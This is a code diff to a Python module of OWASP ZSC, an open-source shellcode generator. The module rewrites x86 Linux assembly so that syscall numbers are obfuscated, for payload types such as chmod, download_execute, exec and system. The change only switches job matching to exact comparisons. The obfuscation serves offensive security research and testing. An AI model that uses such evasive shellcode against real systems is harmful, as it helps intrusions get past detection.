@@ -1,13 +1,13 @@
 #!/usr/bin/env python
 '''
 OWASP ZSC | ZCR Shellcoder
-
-ZeroDay Cyber Research
-Z3r0D4y.Com
-Ali Razmjoo
+https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
+https://github.com/Ali-Razmjoo/OWASP-ZSC
+http://api.z3r0d4y.com/
+https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project [ owasp-zsc-tool-project[at]lists[dot]owasp[dot]org ]
 '''
 def start(type,shellcode,job):
-	if 'chmod(' in job:	
+	if 'chmod' == job:	
 		value = type.rsplit('add_')[1][2:]
 		t = True
 		eax = str('0x0f909090')
@@ -66,7 +66,7 @@ def start(type,shellcode,job):
 				else:
 					t = False
 		shellcode = start + middle + end
-	if 'dir_create(' in job:
+	elif 'dir_create' == job:
 		value = str(type.rsplit('add_')[1][2:])
 
 		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
@@ -97,7 +97,7 @@ def start(type,shellcode,job):
 		if A is 0:
 			eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
 		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_add+'\ncltd\n')
-	if 'download_execute(' in job:
+	elif 'download_execute' == job:
 		value = str(type.rsplit('add_')[1][2:])
 
 		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
@@ -128,7 +128,7 @@ def start(type,shellcode,job):
 		if A is 0:
 			eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
 		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_add+'\ncltd\n')
-	if 'download(' in job:
+	elif 'download' == job:
 		value = str(type.rsplit('add_')[1][2:])
 
 		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
@@ -159,7 +159,7 @@ def start(type,shellcode,job):
 		if A is 0:
 			eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
 		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_add+'\ncltd\n')
-	if 'exec(' in job:
+	elif 'exec' == job:
 		value = str(type.rsplit('add_')[1][2:])
 		t = True
 		eax = str('0x46909090')
@@ -192,7 +192,7 @@ def start(type,shellcode,job):
 						shellcode = shellcode.replace(line,command)
 						t = False
 		shellcode = shellcode.replace('_z3r0d4y_','')
-	if 'file_create(' in job:
+	elif 'file_create' == job:
 		value = str(type.rsplit('add_')[1][2:])
 
 		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
@@ -223,7 +223,7 @@ def start(type,shellcode,job):
 		if A is 0:
 			eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
 		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_add+'\ncltd\n')
-	if 'script_executor(' in job:
+	elif 'script_executor' == job:
 		value = str(type.rsplit('add_')[1][2:])
 
 		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
@@ -254,7 +254,7 @@ def start(type,shellcode,job):
 		if A is 0:
 			eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
 		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_add+'\ncltd\n')
-	if 'system(' in job:
+	elif 'system' == job:
 		value = str(type.rsplit('add_')[1][2:])
 		shellcode = 'xor %edx,%edx\n' + shellcode.replace('push   $0xb\npop    %eax\ncltd','').replace('push   %ebx\nmov    %esp,%ecx','push   %ebx\nmov    %esp,%ecx'+'\n'+'push   $0xb\npop    %eax\ncltd')
 		for line in shellcode.rsplit('\n'):
@@ -284,7 +284,7 @@ def start(type,shellcode,job):
 		if A is 0:
 			eax_add = 'push $0x%s\npop %%eax\nadd $0x%s,%%eax\nshr $0x10,%%eax\nshr $0x08,%%eax\n'%(eax_2,eax_1)
 		shellcode = shellcode.replace('push   $0xb909090\npop    %eax\ncltd',eax_add+'\ncltd\n')
-	if 'write(' in job:
+	elif 'write' == job:
 		value = str(type.rsplit('add_')[1][2:])
 		eax = str('0x5909090')
 		eax_1 = value
